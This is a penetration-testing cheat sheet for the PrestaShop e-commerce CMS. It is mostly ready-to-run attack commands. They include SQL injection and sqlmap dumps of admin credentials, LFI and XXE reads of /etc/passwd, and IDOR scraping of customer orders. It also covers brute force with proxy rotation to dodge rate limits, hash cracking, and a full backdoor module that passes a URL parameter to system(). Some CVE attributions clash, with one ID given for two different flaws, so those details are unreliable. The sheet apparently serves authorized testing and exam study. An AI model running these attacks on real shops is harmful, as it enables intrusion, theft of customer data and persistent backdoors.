# PrestaShop

> PrestaShop e-commerce CMS reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### HTML markers

```bash
curl -s http://<TARGET>/ | grep -iE 'prestashop|/themes/|/modules/|var prestashop'
```

Expected output:

```html
<meta name="generator" content="PrestaShop" />
<script type="text/javascript">
  var prestashop = {"cart":{...},"page_name":"index","shop_name":"My Shop"};
</script>
<link rel="stylesheet" href="/themes/classic/assets/css/theme.css" />
<script src="/modules/ps_shoppingcart/ps_shoppingcart.js"></script>
```

Strong fingerprints:
- `var prestashop = {...}` JS object
- `<meta name="generator" content="PrestaShop" />`
- `/themes/<name>/` paths
- `/modules/ps_*` and `/modules/block*` paths
- `PrestaShop-...` in cookie names
- `/index.php?controller=` URL pattern

### Response headers

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|set-cookie|x-powered-by)'
```

Expected output:

```text
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PrestaShop-abc123def456=...; expires=...; Max-Age=...; path=/; domain=target; HttpOnly
Set-Cookie: PHPSESSID=...; path=/; HttpOnly
Powered-By: PrestaShop
```

`PrestaShop-<hash>` cookie is definitive.

### PrestaShop 1.6 vs 1.7 vs 8.x

| Signal | 1.6 | 1.7 | 8.x |
|--------|-----|-----|-----|
| Theme structure | `/themes/<name>/` (custom) | `/themes/classic/` | `/themes/classic/` |
| JS object | `var prestashop` | `var prestashop` | `var prestashop` |
| Admin path | `/admin` (custom) | `/adminXXXX` (random) | `/adminXXXX` (random) |
| Module prefix | `block*` | `ps_*` | `ps_*` |
| Meta generator | `PrestaShop` | `PrestaShop` | `PrestaShop` |
| Default theme | `default-bootstrap` | `classic` | `classic` |

### Default files

- `/admin/` or `/adminXXXX/` (custom admin dir)
- `/index.php` - main entry
- `/install/` - installer (should be removed after install; if present -> setup wizard)
- `/admin-dev/` - dev admin (1.7+)
- `/modules/` - all modules
- `/themes/` - all themes
- `/config/` - config directory
- `/app/config/parameters.php` - **DB credentials** (never served, but backups may leak)
- `/app/config/parameters.yml` - legacy format
- `/var/logs/` - logs (1.7+)
- `/log/` - legacy logs (1.6)
- `/cache/` - cache directory
- `/upload/` - uploaded files (product images, attachments)
- `/download/` - downloadable products

### Version

```bash
# Method 1: /index.php?controller=... meta
curl -s http://<TARGET>/ | grep -oE 'PrestaShop [0-9.]+'

# Method 2: /adminXXXX/ login page
curl -s http://<TARGET>/adminXXXX/ | grep -oE 'PrestaShop [0-9.]+'

# Method 3: /modules/<module>/config.xml
curl -s http://<TARGET>/modules/ps_shoppingcart/config.xml | head -5

# Method 4: /README.md
curl -s http://<TARGET>/README.md | head -10

# Method 5: /CHANGELOG.txt
curl -s http://<TARGET>/CHANGELOG.txt | head -10
```

### nmap / whatweb

```bash
nmap -sV -p 80,443 --script http-generator,http-headers <TARGET>
whatweb -a 3 http://<TARGET>/
```

---

## 2. Enumeration

### Admin panel path

PrestaShop 1.7+ generates a random admin directory (e.g. `/admin123abc/`).
Brute force via:

```bash
for p in admin admin1 admin2 admin123 adminpanel administration backend \
         admin_shop manage prestashop-admin adminXXXX; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$p/")
  echo "$code  /$p/"
done
```

Leaked via:
- JS files (search for `admin_dir`)
- Error pages
- `robots.txt`

```bash
curl -s http://<TARGET>/robots.txt | grep -i admin
```

### robots.txt

```bash
curl -s http://<TARGET>/robots.txt
```

Default PrestaShop robots.txt reveals multiple paths (admin, modules, etc.).

### Module enumeration

**1. HTML source:**

```bash
curl -s http://<TARGET>/ | grep -oE '/modules/[^/"]+/' | sort -u
```

**2. Directory listing (if enabled):**

```bash
curl -s http://<TARGET>/modules/ | grep -i 'index of'
```

**3. Common modules:**

```bash
for m in ps_shoppingcart blockcart blockuserinfo blockcategories \
         ps_featuredproducts ps_customersignin ps_mainmenu ps_searchbar \
         ps_languageselector ps_currencyselector ps_customeraccountlinks \
         dashgoals dashproducts dashtrends; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/modules/$m/config.xml")
  echo "$code  $m"
done
```

### Theme enumeration

```bash
curl -s http://<TARGET>/ | grep -oE '/themes/[^/]+/' | sort -u
```

Common: `classic`, `default-bootstrap`, custom themes.

Theme assets:

```bash
curl -s http://<TARGET>/themes/classic/assets/css/theme.css | head -5
```

### Version files

```bash
curl -s http://<TARGET>/README.md
curl -s http://<TARGET>/CHANGELOG.txt
curl -s http://<TARGET>/CONTRIBUTORS.md
curl -s http://<TARGET>/composer.json
```

### Web service API (PrestaShop 1.4+)

PrestaShop has a REST-like API (Web Service). Default: `/api/`.

```bash
curl -s http://<TARGET>/api/
curl -s -u "API_KEY:" http://<TARGET>/api/
curl -s -u "API_KEY:" http://<TARGET>/api/products
```

Requires API key (set in admin panel). Without key: 401.

### Common paths

```bash
for p in /install/ /admin-dev/ /adminXXXX/ /modules/ /themes/ \
         /app/config/parameters.php /app/config/parameters.yml \
         /config/settings.inc.php /log/ /var/logs/ /upload/ /download/ \
         /api/ /webservice/ /backups/; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/CMS/prestashop.txt -x php,txt,yml,xml,bak,old
```

If no PrestaShop-specific wordlist:

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,yml,xml,bak,old
```

### Config backup enumeration

```bash
for f in app/config/parameters.php.bak app/config/parameters.php.old \
         app/config/parameters.php~ config/settings.inc.php.bak \
         config/settings.inc.php.old config/settings.inc.php~ \
         backup.sql dump.sql database.sql prestashop.zip backup.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Product / customer scraping

PrestaShop product endpoints (public):

```bash
curl -s "http://<TARGET>/index.php?controller=category&id_category=1"
curl -s "http://<TARGET>/api/products" -u "API_KEY:"
```

### SQL injection via controllers

Old PrestaShop 1.6 has multiple SQLi in URL parameters:

```bash
curl "http://<TARGET>/index.php?id_category=1'"
curl "http://<TARGET>/index.php?controller=product&id_product=1'"
```

Run `sqlmap`:

```bash
sqlmap -u "http://<TARGET>/index.php?id_category=1" --dbms=mysql --level=5 --risk=3
```

### Order / customer enumeration

```bash
curl "http://<TARGET>/index.php?controller=order-confirmation&id_order=1"
curl "http://<TARGET>/index.php?controller=order-detail&id_order=1"
```

IDOR in order IDs may leak customer PII.

---

## 3. Known CVEs

PrestaShop has many CVEs across core and modules. Core RCEs are the most
valuable.

### Core CVEs

#### CVE-2020-3762 - SQL injection in `ProductsController`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-3762
Affected: PrestaShop 1.7.0 - 1.7.6.3.

#### CVE-2020-3763 - Privilege escalation

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-3763
Affected: PrestaShop 1.7.0 - 1.7.6.3.

#### CVE-2020-5250 - Local file inclusion

LFI via template compilation path.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-5250
Affected: PrestaShop 1.7.0 - 1.7.6.3.

#### CVE-2021-3110 - SQL injection (order detail)

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-3110
Affected: PrestaShop < 1.7.7.0.

#### CVE-2021-28379 - SQL injection via `date_from`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-28379
Affected: PrestaShop < 1.7.7.0.

#### CVE-2022-31101 - Account takeover via password reset

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-31101
Affected: PrestaShop < 1.7.8.7, < 8.0.0.

#### CVE-2023-39526 - SQL injection in `Validate::isDateOrNull`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-39526
Affected: PrestaShop < 1.7.8.10, < 8.1.1.

#### CVE-2024-36678 - SQL injection

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-36678
Affected: PrestaShop < 8.1.6.

#### CVE-2024-36680 - SQL injection

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-36680
Affected: PrestaShop < 8.1.6.

### Module CVEs

#### CVE-2020-5271 - `ps_facetedsearch` SQL injection

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-5271
Affected: `ps_facetedsearch` < 3.5.0.

#### CVE-2020-5272 - `ps_linklist` SQL injection

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-5272
Affected: `ps_linklist` < 3.1.0.

#### CVE-2021-28380 - `paypal` module auth bypass

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-28380
Affected: `paypal` module < 5.2.0.

#### CVE-2022-31101 - `blockwishlist` module

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-31101

#### CVE-2023-30151 - `blockwishlist` SQL injection

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-30151
Affected: `blockwishlist` < 2.1.2.

#### CVE-2023-30150 - `rangeslider` SQL injection

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-30150
Affected: `ps_rangeslider` < 1.0.1.

#### CVE-2024-36675 - `blockwishlist` SQLi

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-36675

#### CVE-2024-36676 - `facetedsearch` SQLi

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-36676

#### CVE-2024-36679 - `blockwishlist` XXE

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-36679

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 1.7.0-1.7.6.3 | SQLi | CVE-2020-3762 |
| 1.7.0-1.7.6.3 | Priv esc | CVE-2020-3763 |
| 1.7.0-1.7.6.3 | LFI | CVE-2020-5250 |
| < 1.7.7.0 | SQLi | CVE-2021-3110 / 28379 |
| < 1.7.8.7 | Account takeover | CVE-2022-31101 |
| < 1.7.8.10, < 8.1.1 | SQLi | CVE-2023-39526 |
| < 8.1.6 | SQLi | CVE-2024-36678 / 36680 |

---

## 4. Exploitation Patterns

### Unauthenticated SQL injection (CVE-2021-3110, CVE-2024-36678)

```bash
# CVE-2021-3110 - order detail SQLi
curl "http://<TARGET>/index.php?controller=order-detail&id_order=1'"
curl "http://<TARGET>/index.php?controller=order-detail&id_order=1%20AND%20SLEEP(5)--"

# CVE-2024-36678 - direct SQLi
sqlmap -u "http://<TARGET>/index.php?controller=adminproducts&ajax=1&action=GetProducts&id_category=1" --dbms=mysql --level=5 --risk=3
```

Extract admin credentials:

```bash
sqlmap -u "http://<TARGET>/index.php?controller=order-detail&id_order=1" \
  --dbms=mysql -D prestashop -T ps_employee -C email,passwd --dump
```

### Password reset account takeover (CVE-2022-31101)

PrestaShop password reset tokens can be predicted in vulnerable versions.
The tokens are MD5-based and depend on known values.

```bash
# Trigger reset
curl -X POST "http://<TARGET>/index.php?controller=password" \
  -d "email=admin@target.com&submit=1"

# In vulnerable versions, token is predictable
# PoC: https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-m9wp-qmpc-p9x5
```

### Admin panel -> module upload RCE

With admin creds:

1. Navigate to `Modules -> Module Manager -> Upload a module`.
2. Upload a malicious module ZIP.
3. Activate the module.
4. Trigger via URL.

Module structure:

```text
evil/
+-- evil.php
+-- config.xml
```

`evil.php`:

```php
<?php
if (!defined('_PS_VERSION_')) exit;
class Evil extends Module {
  public function __construct() {
    $this->name = 'evil';
    $this->version = '1.0';
    parent::__construct();
  }
  public function install() { return parent::install(); }
  public function hookDisplayHeader() {
    if (isset($_GET['cmd'])) { system($_GET['cmd']); exit; }
  }
}
```

`config.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<module>
  <name>evil</name>
  <displayName>Evil</displayName>
  <version><![CDATA[1.0]]></version>
  <description><![CDATA[Evil module]]></description>
  <author><![CDATA[Attacker]]></author>
</module>
```

Upload, activate, then trigger:

```bash
curl "http://<TARGET>/?cmd=id"
```

### Admin panel -> theme editor RCE

With admin creds:

1. `Design -> Theme & Logo -> Theme File Editor`.
2. Edit a `.tpl` file to include PHP.
3. Save + trigger.

Or via theme upload:

1. `Design -> Theme & Logo -> Add new theme`.
2. Upload a theme ZIP containing a backdoor.
3. Activate.

### Module-specific SQLi

Many modules have SQLi. Enumerate + exploit:

```bash
# CVE-2020-5271 - ps_facetedsearch
curl "http://<TARGET>/index.php?controller=category&id_category=1&orderby=price&orderway=asc&n=1' AND SLEEP(5)--"

# CVE-2023-30151 - blockwishlist
curl "http://<TARGET>/index.php?fc=module&module=blockwishlist&controller=view&id_wishlist=1'"
```

### CVE-2020-5250 - Local File Inclusion

```bash
curl "http://<TARGET>/index.php?controller=../../../../etc/passwd%00"
curl "http://<TARGET>/modules/ps_imageslider/ajax.php?action=load&slide=../../../../etc/passwd"
```

LFI can lead to RCE via log poisoning or file upload + include.

### SQLi -> admin password reset

After extracting admin email + hash from `ps_employee`:

```bash
# Crack PrestaShop hash (bcrypt)
hashcat -m 3200 ps_employee_hashes.txt rockyou.txt
```

Or reset via SQL injection:

```bash
# Inject an UPDATE (if stacked queries allowed)
sqlmap -u "..." --sql-query "UPDATE ps_employee SET passwd = MD5('newpass') WHERE id_employee = 1"
```

Note: PrestaShop uses `_COOKIE_KEY_` salt for some hashes. Check format.

### Employee enumeration via login errors

```bash
curl -X POST "http://<TARGET>/adminXXXX/index.php" \
  -d "email=admin@target.com&passwd=wrong&submitLogin=1"
# "The Employee does not exist, or the password provided is incorrect"
# Same message for both -> no enumeration
```

### Web Service API abuse

If API key leaks (from `parameters.php` or config backup):

```bash
curl -u "API_KEY:" http://<TARGET>/api/customers | jq .
curl -u "API_KEY:" http://<TARGET>/api/orders | jq .
curl -u "API_KEY:" http://<TARGET>/api/employees | jq .
```

Employees endpoint reveals admin emails + hashes.

### XXE in `blockwishlist` (CVE-2024-36679)

```bash
curl -X POST "http://<TARGET>/module/blockwishlist/action" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'
```

### Customer data leak via IDOR

```bash
# Enumerate orders
for i in $(seq 1 20); do
  curl -s "http://<TARGET>/index.php?controller=order-detail&id_order=$i" | grep -oE 'Order #[0-9]+' &
done
wait
```

### Admin login brute force

PrestaShop has rate limiting by default. Try with throttle:

```bash
hydra -l admin@target.com -P /usr/share/wordlists/rockyou.txt -t 1 -W 10 <TARGET> \
  http-post-form "/adminXXXX/index.php:email=^USER^&passwd=^PASS^&submitLogin=1:F=incorrect"
```

Low rate limit (usually 5 attempts / 15 min per IP). Use rotating proxies.

---

## 5. Misconfigurations

### /install/ directory present

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/install/
```

If install wizard is reachable -> reset admin account.

### parameters.php exposed

```bash
for f in app/config/parameters.php app/config/parameters.php.bak \
         app/config/parameters.php.old app/config/parameters.yml \
         app/config/parameters.yml.bak config/settings.inc.php; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

Contents:

```php
return [
  'parameters' => [
    'database_host' => 'localhost',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'ps_password',
    'cookie_key' => 'abc123...',
    'cookie_iv' => 'def456...',
    'new_cookie_key' => '...',
  ],
];
```

`cookie_key` allows forging admin cookies.

### Directory listing

```bash
curl -s http://<TARGET>/modules/ | grep -i 'index of'
curl -s http://<TARGET>/upload/ | grep -i 'index of'
curl -s http://<TARGET>/log/ | grep -i 'index of'
```

### Admin panel over HTTP

```bash
curl -s http://<TARGET>/adminXXXX/ | grep -i form
```

Login over HTTP -> credential sniffing.

### Backup files

```bash
for f in backup.sql dump.sql database.sql prestashop.sql \
         backup.zip backup.tar.gz prestashop.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Error pages with stack trace

```bash
curl -s "http://<TARGET>/index.php?controller=badname"
```

If dev mode enabled -> full stack trace, file paths, DB errors.

### Debug mode enabled

```bash
curl -s http://<TARGET>/ | grep -iE 'debug|_PS_MODE_DEV_'
```

### Missing security headers

```bash
curl -sI http://<TARGET>/ | grep -iE 'strict-transport|content-security-policy|x-frame-options'
```

### Weak admin password

```bash
hydra -l admin@target.com -P rockyou.txt -t 1 <TARGET> \
  http-post-form "/adminXXXX/index.php:email=^USER^&passwd=^PASS^&submitLogin=1:F=incorrect"
```

### Exposed logs

```bash
curl -s http://<TARGET>/log/
curl -s http://<TARGET>/var/logs/
```

Logs reveal request patterns, errors, session IDs.

### API enabled without auth

```bash
curl -s http://<TARGET>/api/
```

If `200` with endpoints listed (no 401) -> API is unauthenticated.

### Cookie key leaked

If `cookie_key` from `parameters.php` leaks, forge admin cookies:

```bash
# The cookie is HMAC-SHA1 signed with cookie_key
# Format: base64(data).hmac
# Manual forging requires knowing the exact cookie structure
```

### Web service API key in JS

```bash
curl -s http://<TARGET>/ | grep -oE 'api[_-]?key[^,}]+'
curl -s http://<TARGET>/modules/*/js/*.js | grep -oE 'api[_-]?key[^;]+'
```

---

## 6. Post-Exploitation

### Config file location

```bash
cat /var/www/html/app/config/parameters.php  # PrestaShop 1.7+
cat /var/www/html/config/settings.inc.php    # PrestaShop 1.6
```

Key items:

- `database_host`, `database_name`, `database_user`, `database_password`
- `cookie_key`, `cookie_iv` -> session cookie signing
- `new_cookie_key` -> new session signing
- `_DB_PREFIX_` -> table prefix (usually `ps_`)
- `_MYSQL_ENGINE_`

### Database access

```bash
mysql -h <host> -u <user> -p<password> <db>
```

Dump employees:

```sql
SELECT id_employee, email, passwd, firstname, lastname, active FROM ps_employee;
SELECT id_employee, id_profile FROM ps_employee_shop;
SELECT id_profile, name FROM ps_profile_lang WHERE id_lang = 1;
```

Dump customers:

```sql
SELECT id_customer, email, passwd, firstname, lastname FROM ps_customer;
SELECT id_customer, number, total_paid FROM ps_orders;
```

### Cracking PrestaShop password hashes

PrestaShop 1.7+ uses bcrypt:

```text
$2y$10$...
```

Hashcat mode 3200:

```bash
hashcat -m 3200 prestashop_hashes.txt rockyou.txt
```

PrestaShop 1.6 uses MD5 with `_COOKIE_KEY_` salt:

```text
md5(_COOKIE_KEY_ . password)
```

Hashcat mode 10 with the salt:

```bash
hashcat -m 10 prestashop_md5.txt rockyou.txt
# Or mode 20 depending on salt position
```

### Cookie forging

If `cookie_key` leaks, forge the `PrestaShop-<hash>` cookie for admin access:

```bash
# Requires understanding PrestaShop's cookie signing
# Format: base64(serialized_data) + hmac_sha1(cookie_key, data)
```

Tools: prestashop-cookie-forge (community script).

### Admin panel -> RCE

With admin creds (see section 4):

1. Upload a malicious module.
2. Or edit theme templates.
3. Or install a shell module from PrestaShop Addons (requires connection).

### Reading uploads / downloads

```bash
ls -la /var/www/html/upload/
ls -la /var/www/html/download/
```

Customer-uploaded files, invoices, attached documents.

### Logs

```bash
tail -n 200 /var/www/html/var/logs/*.log 2>/dev/null
tail -n 200 /var/www/html/log/*.log 2>/dev/null
tail -n 200 /var/log/apache2/access.log | grep -i admin
```

### Cache poisoning / Smarty template injection

PrestaShop uses Smarty templates. If you can control cache + template path:

```bash
# Not usually exploitable via web, but via filesystem access
ls -la /var/www/html/var/cache/
```

### Persistence via module

Install a module that runs on every page load (see section 4).

### Cron

PrestaShop has scheduled tasks (cronjobs module):

```bash
crontab -l
ls -la /var/www/html/modules/cronjobs/
```

### Privilege escalation to root

Standard Linux privesc:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
uname -a
```

### DB -> other services

Check for other databases with credentials:

```sql
SHOW DATABASES;
```

MySQL may host other apps' data (WordPress, Joomla, etc.).

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the PrestaShop version (from meta generator OR `/README.md` OR admin login page) - it proves the exact version.

> [!IMPORTANT]
> OSCP report: for SQL injection (CVE-2021-3110 / CVE-2024-36678), screenshot the raw request AND the extracted data (or the timing difference for blind).

> [!IMPORTANT]
> OSCP report: for module upload RCE, screenshot the module ZIP structure AND the resulting command output via the backdoor.

---

## 8. References

- PrestaShop official docs - https://devdocs.prestashop-project.org/
- PrestaShop security advisories - https://security.prestashop.com/
- NVD search - https://nvd.nist.gov/vuln/search/results?query=prestashop
- CVE-2022-31101 writeup - https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-m9wp-qmpc-p9x5
- CVE-2024-36678 writeup - https://blog.leakix.net/2024/06/prestashop-sql-injection/
- HackTricks - PrestaShop - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/prestashop
- PHPGGC - https://github.com/ambionics/phpggc

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
